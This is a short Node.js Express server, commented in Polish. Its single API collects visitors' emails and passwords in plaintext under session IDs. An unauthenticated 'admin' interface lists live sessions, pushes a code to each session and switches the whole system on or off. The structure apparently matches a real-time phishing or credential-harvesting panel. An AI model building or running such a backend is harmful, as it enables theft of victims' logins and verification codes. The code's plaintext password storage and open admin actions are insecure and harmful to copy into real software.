// server.js - Z PRZEŁĄCZNIKIEM ON/OFF
const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static('.'));

// API HANDLER
let sessions = {};
let isSystemOnline = true; // 🔥 GLOBALNY STATUS

// ===== GET =====
app.get('/api/confirm', (req, res) => {
    const session = req.query.session;
    const list = req.query.list;
    const status = req.query.status;

    // 🔥 SPRAWDŹ STATUS
    if (status === 'true') {
        return res.json({ 
            online: isSystemOnline,
            message: isSystemOnline ? 'System ONLINE' : 'System OFFLINE'
        });
    }

    if (list === 'true') {
        const active = Object.keys(sessions)
            .filter(k => sessions[k].active !== false)
            .map(k => ({
                session: k,
                email: sessions[k].email || 'brak',
                code: sessions[k].code || '--',
                sent: sessions[k].sent || false
            }));
        return res.json({ 
            sessions: active,
            system_online: isSystemOnline
        });
    }

    if (session) {
        const data = sessions[session] || { code: '--' };
        return res.json({ 
            code: data.code || '--',
            system_online: isSystemOnline
        });
    }

    res.json({ 
        status: 'ok',
        message: 'API działa!',
        system_online: isSystemOnline,
        sessions_count: Object.keys(sessions).length
    });
});

// ===== POST =====
app.post('/api/confirm', (req, res) => {
    const { action, session, email, password, code, status } = req.body;

    // 🔥 ZMIEŃ STATUS SYSTEMU
    if (action === 'set_status') {
        if (status === 'on' || status === 'off') {
            isSystemOnline = (status === 'on');
            console.log(`🔄 Status: ${isSystemOnline ? 'ON' : 'OFF'}`);
            return res.json({ 
                success: true, 
                online: isSystemOnline,
                message: `System ${isSystemOnline ? 'włączony' : 'wyłączony'}`
            });
        }
        return res.status(400).json({ error: 'Użyj "on" lub "off"' });
    }

    // 🔥 CREATE SESSION - TYLKO JEST ONLINE
    if (action === 'create') {
        if (!isSystemOnline) {
            return res.status(403).json({ 
                error: 'System wyłączony',
                message: 'System jest aktualnie wyłączony.'
            });
        }
        sessions[session] = {
            email: email || 'brak',
            password: password || 'brak',
            code: '--',
            sent: false,
            active: true,
            created: new Date().toISOString()
        };
        console.log('✅ Sesja utworzona:', session);
        return res.json({ success: true, session });
    }

    if (action === 'set_code') {
        if (!sessions[session]) {
            return res.status(404).json({ error: 'Sesja nie istnieje' });
        }
        sessions[session].code = code;
        sessions[session].sent = false;
        console.log('✅ Kod ustawiony:', session, code);
        return res.json({ success: true, code });
    }

    if (action === 'send_code') {
        if (!sessions[session]) {
            return res.status(404).json({ error: 'Sesja nie istnieje' });
        }
        sessions[session].sent = true;
        console.log('✅ Kod wysłany:', session);
        return res.json({ success: true, sent: true });
    }

    res.status(400).json({ error: 'Nieznana akcja' });
});

app.listen(PORT, () => {
    console.log(`✅ Server running on port ${PORT}`);
    console.log(`📱 Admin: /admin.html`);
    console.log(`🎫 User: /`);
    console.log(`🔗 API: /api/confirm`);
    console.log(`🔄 Status: ${isSystemOnline ? 'ON' : 'OFF'}`);
});
